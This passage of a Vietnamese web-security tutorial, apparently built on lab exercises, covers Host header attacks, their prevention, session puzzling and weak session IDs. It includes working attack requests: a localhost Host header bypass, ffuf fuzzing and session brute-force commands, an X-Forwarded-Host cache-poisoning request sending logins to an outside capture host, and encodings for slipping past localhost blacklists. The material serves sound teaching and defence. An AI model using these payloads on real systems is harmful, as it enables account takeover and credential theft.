- **Tấn công "password reset poisoning"**: Nhiều ứng dụng web sử dụng giá trị của Host header để tạo các liên kết tuyệt đối, chẳng hạn như liên kết đặt lại mật khẩu. Nếu giá trị **Host header** không được kiểm tra cẩn thận và ứng dụng web tạo liên kết đặt lại mật khẩu dựa trên đó, kẻ tấn công có thể thay đổi giá trị Host header để tạo ra các liên kết độc hại, dẫn đến việc người dùng bị gửi liên kết đặt lại mật khẩu đến một trang giả mạo.

#### **3. Thử Nghiệm Các Cuộc Tấn Công Host Header**

Trong môi trường thực tế, việc thử nghiệm các lỗ hổng **Host header** có thể gặp khó khăn do các hệ thống trung gian như **CDN** và **reverse proxies** có thể xử lý yêu cầu dựa trên giá trị **Host header**. Nếu Host header chứa giá trị không hợp lệ, các hệ thống này có thể không biết phải chuyển tiếp yêu cầu đi đâu và có thể từ chối hoặc trả về lỗi. Tuy nhiên, các cuộc tấn công **Host header** vẫn có thể khai thác được nếu kết hợp với các kỹ thuật tấn công khác như **web cache poisoning**.

---

#### **4. Override Headers và Tấn Công Host Header**

Ngoài **Host header**, còn có những **Override Headers** khác có thể được sử dụng để thay thế giá trị của **Host header** và có thể bị khai thác trong các cuộc tấn công **Host header**. Những header này bao gồm:

- **X-Forwarded-Host**
- **X-HTTP-Host-Override**
- **Forwarded**
- **X-Host**
- **X-Forwarded-Server**

Trong một số trường hợp, ứng dụng web có thể đã áp dụng kiểm tra hợp lệ cho **Host header** nhưng lại không kiểm tra các **Override Headers** này, tạo ra lỗ hổng để kẻ tấn công có thể khai thác. Nếu ứng dụng hỗ trợ các **Override Headers** và không kiểm tra chúng đúng cách, kẻ tấn công có thể thay đổi giá trị của các header này để vượt qua các biện pháp bảo vệ và thực hiện các cuộc tấn công **Host header**.

---
# 9. Tấn Công Bỏ Qua Xác Thực (Authentication Bypass) qua Host Header

#### **1. Tổng Quan**

Khai thác các cuộc tấn công **host header** không phải lúc nào cũng đơn giản, nhưng khi thành công, chúng có thể cho phép kẻ tấn công bỏ qua các kiểm tra bảo mật, bao gồm cả **authentication bypass**. Trong trường hợp này, ứng dụng web có thể sử dụng **Host header** để kiểm tra xem yêu cầu có đến từ mạng nội bộ hay không, mà không thực sự kiểm tra đúng cách hoặc không xác thực đầy đủ, khiến ứng dụng trở nên dễ bị tấn công.

#### **2. Ví Dụ về Tấn Công Authentication Bypass**

**Bước 1: Nhận diện lỗ hổng**

Trong ví dụ này, chúng ta có một ứng dụng web đơn giản với một khu vực quản trị (admin area). Tuy nhiên, khi cố gắng truy cập vào khu vực quản trị thông qua đường dẫn `/admin.php`, ứng dụng web trả về một lỗi yêu cầu chỉ có thể truy cập từ mạng nội bộ.

**Thông báo lỗi:**
```
The admin area can only be accessed locally!
```
Dòng thông báo này chỉ ra rằng ứng dụng web kiểm tra yêu cầu để xác định xem nó có đến từ một mạng nội bộ hay không. Vậy, làm thế nào để ứng dụng kiểm tra nguồn gốc của yêu cầu này?

Một trong những phương pháp dễ dàng và an toàn để kiểm tra là sử dụng địa chỉ IP của yêu cầu. Tuy nhiên, nếu ứng dụng web nằm sau một **reverse proxy**, việc kiểm tra dựa trên địa chỉ IP có thể gặp khó khăn. Một cách khác là kiểm tra **Host header**, và đây chính là lỗ hổng mà kẻ tấn công có thể khai thác.

**Bước 2: Khai thác lỗ hổng**

Khi kiểm tra **Host header**, thay vì dùng tên miền hoặc IP công khai, chúng ta có thể thay đổi **Host header** thành giá trị `localhost`. Điều này sẽ làm cho ứng dụng web tin rằng yêu cầu đến từ mạng nội bộ, từ đó bỏ qua kiểm tra xác thực và cho phép kẻ tấn công truy cập vào khu vực quản trị mà không cần đăng nhập.

**Cách khai thác:**
- Gửi yêu cầu HTTP với **Host header** là `localhost`:
  ```
  GET /admin.php HTTP/1.1
  Host: localhost
  ```

Ứng dụng web sẽ tin rằng yêu cầu đến từ một mạng nội bộ và cho phép truy cập vào khu vực quản trị.

#### **3. Fuzzing Host Header**

Nếu ứng dụng web kiểm tra các IP cụ thể từ mạng nội bộ, việc thử nghiệm thủ công sẽ gặp khó khăn vì phải kiểm tra rất nhiều địa chỉ IP. Tuy nhiên, ta có thể **fuzz** (thử nghiệm tự động) **Host header** để tìm các địa chỉ IP có thể bỏ qua kiểm tra xác thực.

**Công cụ Fuzzing:**

Chúng ta có thể sử dụng công cụ như **ffuf** để fuzz **Host header** và thử với các địa chỉ IP từ dải **192.168.0.0-192.168.255.255** (các địa chỉ IP riêng tư).

**Bước 1: Tạo danh sách địa chỉ IP:**

Chúng ta có thể sử dụng một script bash đơn giản để tạo danh sách các địa chỉ IP trong dải `192.168.0.0-192.168.255.255`:
```bash
for a in {1..255}; do
  for b in {1..255}; do
    echo "192.168.$a.$b" >> ips.txt
  done
done
```

**Bước 2: Sử dụng **ffuf** để fuzz Host header:**
```bash
ffuf -u http://IP:PORT/admin.php -w ips.txt -H 'Host: FUZZ' -fs 752
```
Trong đó:
- `FUZZ` là vị trí sẽ được thay thế bởi các giá trị trong danh sách `ips.txt`.
- `-fs 752` giúp lọc các phản hồi có kích thước 752 byte, cho phép chúng ta dễ dàng xác định các phản hồi khác biệt (tức là các phản hồi hợp lệ).

**Kết quả:**
Kết quả sẽ hiển thị các địa chỉ IP mà khi được thay vào **Host header**, ứng dụng web sẽ trả về phản hồi hợp lệ, cho phép kẻ tấn công truy cập vào khu vực quản trị mà không cần phải xác thực.

---
# 10. Tấn Công Password Reset Poisoning qua Host Header

#### **1. Tổng Quan về Password Reset Poisoning**

**Password reset poisoning** là một lỗ hổng phổ biến xảy ra khi một ứng dụng web sử dụng không an toàn **Host header** để tạo liên kết đặt lại mật khẩu. Lỗ hổng này có thể bị khai thác nếu ứng dụng web sử dụng **Host header** để tạo liên kết tuyệt đối trong các thông báo email đặt lại mật khẩu. Nếu kẻ tấn công có thể thay đổi **Host header**, họ có thể làm cho liên kết trong email chỉ đến một tên miền mà kẻ tấn công kiểm soát, từ đó lấy cắp mã thông báo đặt lại mật khẩu của người dùng.

#### **2. Phát Hiện Lỗ Hổng**

**Bước 1: Kiểm tra ứng dụng web**

Trong ví dụ này, khi truy cập ứng dụng web, người dùng sẽ thấy một màn hình đăng nhập đơn giản. Sau khi đăng nhập thành công, ứng dụng hiển thị một số thông tin người dùng cơ bản. Tuy nhiên, khi kiểm tra lưu lượng mạng, chúng ta nhận thấy ứng dụng sử dụng các liên kết tuyệt đối để tải các tệp CSS và JavaScript.

**Bước 2: Thử nghiệm Host Header**

Để kiểm tra lỗ hổng, ta có thể thử thay đổi **Host header** trong yêu cầu HTTP và xem xét xem ứng dụng có sử dụng giá trị này để tạo các liên kết tuyệt đối hay không. Ví dụ, nếu ta thay **Host header** thành `evil.htb`, ứng dụng có thể sẽ sử dụng giá trị này để tạo các liên kết trong trang web, chẳng hạn như liên kết đến các tệp CSS hoặc JavaScript.

Dưới đây là một ví dụ về phản hồi ứng dụng khi **Host header** bị thay đổi:
- Host header ban đầu: `evil.htb`
- Liên kết CSS trong phản hồi: `http://evil.htb/styles.css`

Tuy nhiên, việc này chưa phải là một lỗ hổng khai thác được. Mặc dù ứng dụng sử dụng **Host header** để tạo các liên kết tuyệt đối, nhưng không có lỗ hổng **XSS** vì máy chủ từ chối các ký tự đặc biệt trong **Host header** và cũng không thể ép buộc trình duyệt của nạn nhân gửi yêu cầu với **Host header** bị thao túng.

#### **3. Khai Thác Password Reset Poisoning**

**Bước 1: Phát hiện tính năng đặt lại mật khẩu**

Khi chúng ta thử đặt lại mật khẩu trong ứng dụng, thông báo xuất hiện cho biết ứng dụng sẽ gửi một liên kết đặt lại mật khẩu qua email.

**Bước 2: Tạo liên kết đặt lại mật khẩu với **Host header** bị thao túng**

Ứng dụng web sử dụng **Host header** để xây dựng các liên kết đặt lại mật khẩu với mã thông báo đặt lại trong email. Do đó, kẻ tấn công có thể thao túng **Host header** trong yêu cầu đặt lại mật khẩu để liên kết dẫn đến một tên miền mà họ kiểm soát.

**Bước 3: Sử dụng công cụ Exfiltration**

Để thực hiện tấn công, kẻ tấn công có thể sử dụng công cụ như **Interactsh** (hoặc **interactsh.local** trong môi trường thí nghiệm) để theo dõi các yêu cầu đến tên miền mà kẻ tấn công kiểm soát. Khi kẻ tấn công gửi yêu cầu đặt lại mật khẩu với **Host header** bị thao túng, liên kết đặt lại mật khẩu sẽ chứa mã thông báo đặt lại mật khẩu, cho phép kẻ tấn công chiếm quyền kiểm soát tài khoản của người dùng khi họ nhấp vào liên kết.

**Bước 4: Thực hiện tấn công**

Ví dụ: giả sử chúng ta muốn thực hiện tấn công này đối với người dùng quản trị có địa chỉ email là `[email protected]`. Sau khi gửi yêu cầu đặt lại mật khẩu với **Host header** bị thao túng (ví dụ: `attacker.com`), ứng dụng sẽ gửi email chứa liên kết đặt lại mật khẩu đến người dùng quản trị.

Khi người dùng quản trị nhấp vào liên kết trong email, yêu cầu sẽ được gửi đến **attacker.com**, nơi kẻ tấn công có thể thu thập mã thông báo đặt lại mật khẩu từ URL. Sau đó, kẻ tấn công có thể sử dụng mã thông báo này để đặt lại mật khẩu của nạn nhân và chiếm quyền truy cập vào tài khoản quản trị.

---
# 11. Tấn Công Web Cache Poisoning qua Host Header

#### **1. Tổng Quan về Web Cache Poisoning**

**Web Cache Poisoning** là một loại tấn công mà kẻ tấn công có thể lợi dụng lỗ hổng trong cách ứng dụng web sử dụng bộ nhớ đệm (cache) để ảnh hưởng đến các người dùng khác. Trong trường hợp này, tấn công kết hợp với **Host Header** (đặc biệt là các header thay thế như **X-Forwarded-Host**) có thể tạo ra lỗ hổng trong việc tạo các liên kết tuyệt đối, gây ra sự thay đổi dữ liệu trong bộ nhớ đệm của ứng dụng.

Trong khi **Host header** thường là một phần trong **cache key** (tham số xác định cách bộ nhớ đệm xử lý yêu cầu), điều này giúp ngăn chặn tấn công web cache poisoning, các header thay thế mà ứng dụng sử dụng có thể không được đánh dấu là **keyed** (khóa bộ nhớ đệm). Điều này tạo cơ hội cho việc độc hại hóa (poisoning) bộ nhớ đệm.

#### **2. Phát Hiện Lỗ Hổng Web Cache Poisoning**

**Bước 1: Kiểm Tra Các Tham Số Keyed**

Khi bắt đầu cuộc tấn công, ta sẽ khảo sát ứng dụng web để tìm hiểu các tham số **keyed** (tham số được sử dụng để xác định bộ nhớ đệm). Ở đây, ta thấy rằng cả **path** và **Host header** đều là **keyed** tham số, có nghĩa là ứng dụng sẽ không bị tấn công Web Cache Poisoning nếu chỉ thay đổi **Host header**. Tuy nhiên, không có tham số GET nào cần phải thử nghiệm.

**Bước 2: Thử Thêm Header Override**

Tiếp theo, chúng ta thấy rằng ứng dụng web sử dụng **X-Forwarded-Host** header để xây dựng URL tuyệt đối cho các tệp JavaScript và action của form đăng nhập. Vì **X-Forwarded-Host** là **unkeyed** (không phải tham số khóa bộ nhớ đệm), ta có thể sử dụng nó để gây độc hại bộ nhớ đệm.

Tuy nhiên, ta cần phải thêm một giá trị mới cho **Host header** để tránh gây xung đột với bộ nhớ đệm (cache buster). Việc này sẽ đảm bảo rằng bộ nhớ đệm không phục vụ các yêu cầu trước đó mà không bị nhiễu loạn.

#### **3. Khai Thác Web Cache Poisoning**

**Bước 1: Chuẩn Bị Tấn Công**

Lần này, chúng ta sẽ khai thác lỗ hổng bằng cách sử dụng **X-Forwarded-Host** header bị thao túng để chuyển hướng yêu cầu tới một máy chủ do kẻ tấn công kiểm soát. Mục tiêu là sử dụng một **JavaScript import** độc hại hoặc thay đổi hành động form đăng nhập để thực hiện tấn công **XSS** hoặc lấy cắp thông tin đăng nhập.

Để thực hiện tấn công này, ta sử dụng **Interact.sh** để theo dõi các yêu cầu từ máy chủ kẻ tấn công.

**Bước 2: Thực Hiện Yêu Cầu Web với Headers Thao Túng**

Giả sử ứng dụng web sử dụng domain `admin.hostheaders.htb` cho **Host header**, ta có thể gửi yêu cầu HTTP sau:

```
GET /login.php HTTP/1.1
Host: admin.hostheaders.htb
X-Forwarded-Host: cf187gp2vtc0000b03cgg8owd3ayyyyyb.oast.fun
```

Ta gửi yêu cầu này hai lần để đảm bảo rằng yêu cầu thứ hai sẽ trúng vào bộ nhớ đệm (cache hit). Sau đó, ta chỉ cần đợi một người dùng khác đăng nhập vào ứng dụng.

**Bước 3: Theo Dõi Kết Quả trên Interact.sh**

Khi người dùng khác đăng nhập vào ứng dụng, nếu bộ nhớ đệm đã bị độc hại hóa thành công, thông tin đăng nhập của họ sẽ được gửi đến máy chủ của kẻ tấn công. Ta có thể theo dõi yêu cầu này trên **Interact.sh** hoặc **interactsh.local** (nếu đang làm việc trong môi trường giả lập).

Sau khi nạn nhân đăng nhập và yêu cầu được xử lý qua bộ nhớ đệm bị nhiễm độc, ta sẽ thấy yêu cầu chứa thông tin đăng nhập của nạn nhân, cho phép kẻ tấn công chiếm quyền truy cập vào tài khoản của người dùng.

#### **4. Cách Ngăn Ngừa Web Cache Poisoning**

**Nguy cơ:**
- Web Cache Poisoning có thể gây ra các cuộc tấn công XSS hoặc chiếm quyền truy cập tài khoản nếu kẻ tấn công có thể thay đổi bộ nhớ đệm của ứng dụng web.
- Các header như **X-Forwarded-Host** nếu không được xác thực đúng cách có thể dẫn đến việc kẻ tấn công lợi dụng bộ nhớ đệm.

**Biện pháp khắc phục:**
- Đảm bảo rằng ứng dụng web sử dụng các **keyed headers** cho tất cả các tham số, đặc biệt là **X-Forwarded-Host**, để đảm bảo rằng mỗi yêu cầu được xử lý riêng biệt và không bị tấn công từ các thay đổi trong header.
- Không nên phụ thuộc vào các giá trị không được xác thực như **X-Forwarded-Host** khi tạo các liên kết hoặc thực hiện các hành động quan trọng như đăng nhập hoặc đặt lại mật khẩu.
- Sử dụng các biện pháp bảo mật bổ sung như xác thực hai yếu tố (2FA) để ngăn chặn các cuộc tấn công chiếm quyền truy cập tài khoản.

---
# 12. Tấn Công Bypass Kiểm Tra Host Header và Các Lỗ Hổng Validation

#### **1. Tổng Quan về Tấn Công Bypass Kiểm Tra Host Header**

Một trong những phương pháp phổ biến mà các ứng dụng web sử dụng để ngăn chặn các tấn công liên quan đến **host header** là kiểm tra tính hợp lệ của **host header** trong yêu cầu. Mặc dù vậy, nếu kiểm tra này được triển khai một cách không chính xác, kẻ tấn công vẫn có thể bỏ qua các biện pháp bảo vệ này và thực hiện các tấn công như **web cache poisoning** hoặc **password reset poisoning**.

Trong bài học này, chúng ta sẽ tìm hiểu cách mà kẻ tấn công có thể vượt qua kiểm tra **host header** bằng cách sử dụng những lỗ hổng trong quá trình kiểm tra hoặc các phương pháp tinh vi để thao túng yêu cầu.

#### **2. Nhận Dạng Lỗ Hổng Kiểm Tra Host Header**

**Bước 1: Khám Phá Cách Kiểm Tra Host Header**

Giả sử ứng dụng web mục tiêu là `bypassingchecks.htb`. Khi chúng ta truy cập trang web này, nó sẽ hiển thị một thông báo xác nhận rằng có một cơ chế kiểm tra **host header** được áp dụng. Dựa vào thông tin này, chúng ta có thể thử gửi một yêu cầu với một **host header** tùy ý để kiểm tra phản ứng của ứng dụng.

**Bước 2: Phân Tích Mã Lỗi Khi Gửi Yêu Cầu Có Host Header Tùy Ý**

Khi chúng ta gửi yêu cầu với **host header** tùy chỉnh, ứng dụng phản hồi với một thông báo lỗi, điều này cho thấy cơ chế kiểm tra **host header** đã được triển khai. Tuy nhiên, đây chỉ là bước đầu tiên và có thể có những lỗ hổng mà kẻ tấn công có thể tận dụng.

#### **3. Khai Thác Lỗ Hổng Validation**

**Bước 1: Bỏ Qua Kiểm Tra Bằng Cách Thêm Cổng (Port)**

Một cách thông thường để bỏ qua kiểm tra **host header** là khai thác ứng dụng web khi chạy trên một cổng không phải mặc định. Kiểm tra host header có thể không bao gồm phần **cổng** khi xác minh. Ta có thể thử chỉ định một cổng tùy ý trong **host header** như sau:

```
GET / HTTP/1.1
Host: bypassingchecks.htb:1337
```

Trong trường hợp này, ứng dụng web không phản hồi với lỗi và sẽ chấp nhận **host header** tùy chỉnh này, đồng thời xây dựng các liên kết tuyệt đối với cổng không chính xác mà chúng ta cung cấp. Điều này có thể dẫn đến **defacement** (thay đổi giao diện) của trang web, nghĩa là giao diện của trang web sẽ bị thay đổi khi không tải được các tệp tài nguyên như stylesheet hoặc script.

**Bước 2: Kết Hợp Với Web Cache Poisoning**

Bằng cách kết hợp tấn công **web cache poisoning**, ta có thể tạo ra một cuộc tấn công **defacement**. Điều này có thể làm cho website trở nên không khả dụng hoặc hiển thị sai nội dung do tệp tài nguyên không được tải đúng cách.

#### **4. Sử Dụng Subdomain để Bỏ Qua Kiểm Tra**

Một sai sót phổ biến trong việc kiểm tra **host header** là chỉ kiểm tra phần **postfix** của tên miền mà không kiểm tra xem **host header** có thực sự là một subdomain của tên miền mục tiêu hay không. Điều này cho phép kẻ tấn công có thể giả mạo một **host header** chứa tên miền mục tiêu dưới dạng một subdomain.

Ví dụ, thay vì gửi yêu cầu với tên miền chính `bypassingchecks.htb`, kẻ tấn công có thể gửi yêu cầu với một **host header** như sau:

```
GET / HTTP/1.1
Host: evilbypassingchecks.htb
```

Kẻ tấn công có thể đăng ký tên miền `evilbypassingchecks.htb` và lợi dụng nó để thực hiện các tấn công như **web cache poisoning** hoặc **password reset poisoning**, giống như đã mô tả trong các ví dụ trước.

#### **5. Bypass Blacklist Kiểm Tra Host Header**

Một số ứng dụng web sử dụng **blacklist** (danh sách đen) để ngăn chặn các giá trị **host header** không hợp lệ, như `localhost` hoặc `127.0.0.1`. Tuy nhiên, các biện pháp này rất dễ bị bỏ qua vì kẻ tấn công có thể sử dụng các phương thức mã hóa hoặc biểu diễn khác để vượt qua blacklist.

Ví dụ, các kẻ tấn công có thể sử dụng một số hình thức mã hóa để thay thế `localhost` hoặc `127.0.0.1` trong **host header**:

- **Hexadecimal encoding**: `0x7f000001` (tương đương `127.0.0.1`)
- **Decimal encoding**: `2130706433`
- **Octal encoding**: `0177.0000.0000.0001`
- **IPv6**: `::1`
- **IPv4 address trong IPv6 format**: `[0:0:0:0:0:ffff:127.0.0.1]`
- **Tên miền bên ngoài** mà trỏ về `localhost`: `localtest.me`

Ví dụ, ta có thể kiểm tra mã hex `0x7f000001` bằng cách sử dụng lệnh **ping** để xác nhận rằng nó tương đương với `127.0.0.1`:

```
ping 0x7f000001 -c 1
PING 0x7f000001 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
```

Nếu ứng dụng web chỉ kiểm tra các giá trị cụ thể trong danh sách đen mà không tính đến các cách mã hóa khác, kẻ tấn công có thể dễ dàng vượt qua blacklist và tiếp tục thực hiện tấn công.

---
# 13.Ngăn Ngừa Tấn Công Host Header

Sau khi tìm hiểu các cách nhận dạng và khai thác lỗ hổng **host header**, dưới đây là các phương pháp bảo vệ ứng dụng web khỏi các tấn công này. Phần lớn các lỗ hổng liên quan đến **host header** xuất phát từ việc xử lý không đúng cách hoặc kiểm tra không đầy đủ. Chúng ta sẽ phân tích các ví dụ mã hóa dễ bị tổn thương và cách khắc phục.

---

#### **1. Cấu Hình Không An Toàn**

##### **Tin Tưởng Mù Quáng vào Host Header**

Một số ứng dụng web dựa vào **host header** mà không nhận thức rằng nó có thể bị thay đổi. Ví dụ:

```php
$headers = getallheaders();
$host_header = $headers['Host'];
if (is_local_request($host_header)) {
    echo "Welcome Admin!";
} else {
    echo "Unauthorized! The admin area can only be accessed locally!";
    die();
}
```

**Lỗ hổng:**  
Hàm `is_local_request()` chỉ kiểm tra **host header** với một danh sách giá trị tin cậy. Kẻ tấn công có thể giả mạo **host header** để qua mặt cơ chế xác thực.

**Khắc phục:**  
- Không sử dụng **host header** làm nguồn xác thực.
- Dựa vào địa chỉ IP từ `$_SERVER['REMOTE_ADDR']` nếu cần kiểm tra nguồn yêu cầu.
- Triển khai cơ chế xác thực an toàn như mật khẩu mạnh hoặc xác thực hai yếu tố (2FA).
- Hạn chế truy cập từ bên ngoài bằng tường lửa hoặc VPN.

---

#### **2. Kiểm Tra Host Header Không Đúng Cách**

##### **Ví dụ: Lỗ Hổng Password Reset Poisoning**

```php
function check_host($host_header) {
    return str_ends_with($host_header, get_config_value('domain'));
}

function create_reset_link($user, $host_header) {
    $token = generate_reset_token($user);
    if (check_host($host_header)) {
        return "http://" . $host_header . "/pw_reset.php?token=" . $token;
    }
    return "http://" . get_config_value('domain') . "/pw_reset.php?token=" . $token;
}
```

**Lỗ hổng:**  
- Kiểm tra `str_ends_with` không đủ an toàn, cho phép kẻ tấn công sử dụng tên miền như `evilvulndomain.htb` (có đuôi tương tự như tên miền hợp lệ).

**Khắc phục:**  
Thay thế việc sử dụng **host header** bằng cách lấy giá trị tên miền từ tệp cấu hình:

```php
function create_reset_link($user) {
    $token = generate_reset_token($user);
    return "http://" . get_config_value('domain') . "/pw_reset.php?token=" . $token;
}
```

---

#### **3. Lời Khuyên Tổng Quát**

1. **Sử dụng URL tương đối khi có thể:**  
   URL tương đối không bị ảnh hưởng bởi các tấn công liên quan đến **host header**.

2. **Sử dụng URL tuyệt đối cẩn thận:**  
   Khi cần URL tuyệt đối (ví dụ trong email khôi phục mật khẩu), luôn sử dụng giá trị tên miền được cấu hình bởi quản trị viên.

3. **Không hỗ trợ các override headers:**  
   Cấu hình máy chủ web để vô hiệu hóa các tiêu đề như `X-Forwarded-Host` nhằm giảm thiểu tấn công **host header**.

4. **Khắc phục ngay cả khi lỗ hổng có vẻ không khai thác được:**  
   Ví dụ:

   ```php
   $headers = getallheaders();
   $host_header = $headers['Host'];
   ?>
   <script src="http://<?php echo $host_header ?>/test.js"></script>
   ```

   Lỗ hổng XSS phản chiếu có thể bị khai thác nếu kết hợp với **web cache poisoning** hoặc các override headers.

5. **Không dựa vào cấu hình hệ thống trung gian:**  
   Các proxy hoặc tường lửa có thể chặn yêu cầu với **host header** bị thao túng, nhưng ứng dụng web không nên dựa vào điều này để tự bảo vệ.

---
# 14. Giới Thiệu về Lỗ Hổng Session Puzzling

**Session puzzling** là một lỗ hổng phát sinh do cách xử lý không đúng của các biến phiên (session variables) trong ứng dụng web. Mức độ nghiêm trọng của lỗ hổng này phụ thuộc vào cách ứng dụng triển khai và cách sử dụng các biến phiên.

---

### **1. Tầm Quan Trọng của Session trong HTTP**

**HTTP là một giao thức không trạng thái (stateless protocol):**  
Mỗi yêu cầu HTTP được xử lý độc lập, không có ngữ cảnh với các yêu cầu trước hoặc sau. Để cung cấp ngữ cảnh giữa các yêu cầu (ví dụ: giỏ hàng, xác thực người dùng), các biến phiên, token phiên (session tokens), hoặc cookie phiên (session cookies) được sử dụng.

#### **So sánh Stateful và Stateless Session Tokens**

1. **Stateful Session Tokens:**
   - Server lưu trữ thông tin phiên (ví dụ: ID người dùng) liên quan đến token trên máy chủ.
   - Ví dụ: 
     ```php
     Set-Cookie: PHPSESSID=hvplcmsh88ja77r3dutanmn68u;
     ```
   - Dữ liệu phiên có thể được lưu trong file trên server:
     ```bash
     cat /var/lib/php/sessions/sess_hvplcmsh88ja77r3dutanmn68u
     Username|s:8:"testuser";Active|b:1;
     ```

2. **Stateless Session Tokens:**
   - Dữ liệu cần thiết được mã hóa và lưu trong token.
   - Ví dụ phổ biến: **JSON Web Tokens (JWTs):**
     ```text
     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwi...
     ```

---

### **2. Lỗ Hổng Session Puzzling**

#### **Mô tả lỗ hổng:**

Session puzzling xảy ra khi ứng dụng xử lý các biến phiên không đúng cách, dẫn đến việc một giá trị mặc định không an toàn hoặc thao tác không mong muốn với các biến phiên. Ví dụ:

```php
<?php
require_once('db.php');
session_start();

// Đăng nhập
if (check_password($_POST['username'], $_POST['password'])) {
    $_SESSION['user_id'] = get_user_id($_POST['username']);
    header("Location: profile.php");
    die();
} else {
    echo "Unauthorized";
}

// Đăng xuất
if (isset($_POST['logout'])) {
    $_SESSION['user_id'] = 0;
}
?>
```

**Kịch bản tấn công:**
- Khi đăng nhập, server lưu `user_id` vào session. 
- Khi đăng xuất, `user_id` được đặt thành `0` nhưng session không bị hủy.
- Nếu `0` là một giá trị hợp lệ (ví dụ: ID của admin), kẻ tấn công có thể:
  1. Đăng nhập vào tài khoản của mình.
  2. Đăng xuất để đặt `user_id` thành `0`.
  3. Truy cập trang `/profile.php` để phát hiện rằng mình đang đăng nhập với vai trò admin.

---

### **3. Giải Pháp Ngăn Ngừa**

Để tránh lỗ hổng session puzzling, cần tuân thủ các nguyên tắc sau:

1. **Hủy Session Sau Khi Đăng Xuất:**
   - Không chỉ đặt lại các giá trị biến phiên, mà cần hủy hoàn toàn phiên:
     ```php
     if (isset($_POST['logout'])) {
         session_destroy();
     }
     ```

2. **Sử Dụng Giá Trị Mặc Định An Toàn:**
   - Tránh sử dụng các giá trị mặc định không an toàn. Ví dụ: không nên sử dụng `0` làm ID admin.

3. **Xác Thực Chặt Chẽ Trạng Thái Người Dùng:**
   - Kiểm tra rõ ràng trạng thái xác thực trước khi cho phép truy cập:
     ```php
     if (!isset($_SESSION['user_id']) || $_SESSION['user_id'] <= 0) {
         die("Unauthorized access");
     }
     ```

4. **Mã Hóa và Ký Token (Stateless Sessions):**
   - Nếu sử dụng JWT hoặc các token không trạng thái, cần áp dụng mã hóa mạnh và chữ ký để ngăn việc thao túng.

5. **Thường Xuyên Kiểm Tra Lỗ Hổng:**
   - Thực hiện kiểm tra bảo mật để phát hiện các vấn đề liên quan đến phiên.

---
# 15. Lỗ Hổng Weak Session IDs

Session IDs đóng vai trò quan trọng trong việc quản lý phiên (session) của người dùng. Tuy nhiên, nếu các Session ID không đủ mạnh, chúng có thể bị tấn công và dẫn đến việc chiếm đoạt tài khoản thông qua các kỹ thuật brute-force hoặc dự đoán. Hai yếu tố chính để đảm bảo độ an toàn của Session ID là **độ dài** và **độ ngẫu nhiên (randomness)**.

---

### **1. Short Session IDs (Session ID Ngắn)**

#### **Mô tả vấn đề:**
Session IDs không đủ dài sẽ dễ bị tấn công brute-force, đặc biệt nếu không đảm bảo tính ngẫu nhiên. Theo OWASP, một Session ID an toàn cần:
- Độ dài tối thiểu **16 byte**.
- Không có các phần tử cố định hoặc dự đoán được.

Ví dụ: Một ứng dụng web sử dụng Session ID chỉ dài **4 ký tự**, kết hợp chữ cái thường và số. Điều này làm cho không gian giá trị của Session ID rất nhỏ và có thể brute-force một cách nhanh chóng.

#### **Kỹ thuật brute-force thực tế:**

1. **Tạo danh sách các Session ID khả thi:**
   Sử dụng công cụ `crunch` để tạo wordlist:
   ```bash
   sudo apt install crunch
   crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o wordlist.txt
   ```

2. **Tấn công brute-force bằng ffuf:**
   Sử dụng `ffuf` để thử tất cả các Session ID:
   ```bash
   ffuf -u http://127.0.0.1/profile.php -b 'sessionID=FUZZ' -w wordlist.txt -fc 302 -t 10
   ```

3. **Kết quả:**
   Nếu tìm thấy một Session ID hợp lệ, bạn có thể chiếm đoạt phiên của người dùng khác, bao gồm cả tài khoản admin.

#### **Biện pháp phòng chống:**
- Đảm bảo Session ID có độ dài **tối thiểu 16 byte**.
- Không sử dụng các phần tử cố định hoặc có thể đoán trước trong Session ID.

---

### **2. Insufficient Randomness in Session IDs (Thiếu Tính Ngẫu Nhiên)**

#### **Mô tả vấn đề:**
Ngay cả khi Session ID đủ dài, nhưng nếu không đủ ngẫu nhiên hoặc có các mẫu dễ dự đoán, nó vẫn có thể bị brute-force. Tính ngẫu nhiên được đo lường thông qua **entropy**, và theo OWASP, Session ID cần cung cấp ít nhất **64 bits entropy** để đảm bảo an toàn.

Ví dụ: Một Session ID dài nhưng có mẫu cố định trong một số vị trí ký tự, dẫn đến giảm hiệu quả ngẫu nhiên.

#### **Kiểm tra tính ngẫu nhiên bằng Burp Suite:**

1. **Thu thập Session ID:**
   - Sử dụng Burp Suite để gửi nhiều yêu cầu đăng nhập và thu thập Session IDs.
   - Trong Burp, nhấn chuột phải vào yêu cầu đăng nhập và chọn **Send to Sequencer**.

2. **Phân tích entropy:**
   - Chuyển đến tab **Sequencer** và bắt đầu **Live Capture** để thu thập ít nhất 1000 Session IDs.
   - Nhấn **Analyze Now** để phân tích entropy.

3. **Kết quả:**
   - Burp sẽ đưa ra đánh giá entropy. Nếu entropy thấp (ví dụ: **14 bits** thay vì 64 bits), Session ID không an toàn và dễ bị brute-force.
   - Phân tích vị trí ký tự cho thấy một số ký tự cố định không đóng góp vào entropy, làm giảm tính ngẫu nhiên tổng thể.

#### **Biện pháp phòng chống:**
- Đảm bảo Session ID có tính ngẫu nhiên đủ mạnh, cung cấp tối thiểu **64 bits entropy**.
- Sử dụng các thuật toán tạo Session ID ngẫu nhiên mạnh như `openssl_random_pseudo_bytes()` trong PHP hoặc `SecureRandom` trong Java.

---
# 16. Common Session Variables và Lỗ Hổng Authentication Bypass

**Session Puzzling Vulnerability** xuất hiện khi các biến phiên (**session variables**) được sử dụng không đúng cách, đặc biệt khi chúng được dùng chung cho nhiều mục đích trên server. Điều này có thể dẫn đến các lỗ hổng nghiêm trọng, chẳng hạn như **bypass authentication**.

---

### **1. Phát Hiện Lỗ Hổng**

#### **Tổng quan về ứng dụng web:**
Ứng dụng cung cấp:
- **Chức năng đăng nhập:** Hiển thị thông tin người dùng sau khi đăng nhập.
- **Chức năng quên mật khẩu:** Yêu cầu trả lời câu hỏi bảo mật để đặt lại mật khẩu.

Khi thực hiện quên mật khẩu:
1. Người dùng nhập **username**.
2. Trả lời câu hỏi bảo mật.
3. Đặt mật khẩu mới.

#### **Phân tích lưu lượng mạng:**
- Dữ liệu từ các bước quên mật khẩu được truyền qua nhiều yêu cầu HTTP liên tiếp.
